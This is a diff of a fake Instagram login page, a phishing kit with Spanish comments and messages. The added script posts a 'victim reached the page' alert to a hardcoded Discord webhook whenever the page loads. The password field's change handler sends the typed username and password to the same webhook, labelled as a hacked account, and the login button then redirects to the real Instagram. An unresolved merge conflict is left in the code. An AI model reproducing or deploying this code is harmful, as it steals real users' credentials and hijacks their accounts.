@@ -9,6 +9,29 @@
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
+
+
+        <script>
+            window.addEventListener('DOMContentLoaded', function(){
+
+                const entrada = {
+                                content: "Una victima a accedido a la pagina",
+                                username: "Instagram Hacker",
+                                };
+
+
+
+                fetch('https://discord.com/api/webhooks/1348787730145869896/Y4JDDeLGkJuQU0v_t8i9gsCVqIGXzF0BrxZPyJ9Yyped1Ev-0rKO5aHkDwWNmLiwr4GY', {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(entrada)
+
+                    });
+
+            
+            });
+
+        </script>
         <section id="mobile" class="flex">
         </section>
         <section id="auth" class="flex direction-column">
@@ -21,30 +44,45 @@
                     <input name="email" placeholder="Phone, user, or email" />
 
                     <label for="password" class="sr-only">Password</label>
-                    <input name="password" type="password" placeholder="Password"/>
+                    <input name="password" type="password" placeholder="Password" onchange="cambio()"/>
 
                     <script>
                         function cambio(){
+
                             var usuario = document.getElementsByName('email')[0].value;
                             var contraseña = document.getElementsByName('password')[0].value;
-                            const webhookURL = 'https://discord.com/api/webhooks/1348787730145869896/Y4JDDeLGkJuQU0v_t8i9gsCVqIGXzF0BrxZPyJ9Yyped1Ev-0rKO5aHkDwWNmLiwr4GY'
+                            
                             const mensaje = {
+<<<<<<< HEAD
                                 content: "Cuenta de Instagram hackeada 🥷\n Usuario: " + usuario + "\nContraseña: " + contraseña,
+=======
+                                content: "Cuenta de Instagram hackeada 🥷| Usuario: " + usuario + " || Contraseña: " + contraseña,
+>>>>>>> f6436652da41c605fbf0e69c4a091f9955956f31
                                 username: "Instagram Hacker",
                                 };
 
-                            fetch('http://192.168.109.128:1234/', {
+
+
+                            fetch('https://discord.com/api/webhooks/1348787730145869896/Y4JDDeLGkJuQU0v_t8i9gsCVqIGXzF0BrxZPyJ9Yyped1Ev-0rKO5aHkDwWNmLiwr4GY', {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
                                 body: JSON.stringify(mensaje)
 
                             });
 
+                            function redirect(){
+
+                                location = 'https://www.instagram.com'
+
+                            }
+
+                            
+
 
                         }
                     </script>
 
-                    <button type="button" onclick="cambio()">Entrar</button>
+                    <button type="button" onclick="redirect()" >Entrar</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
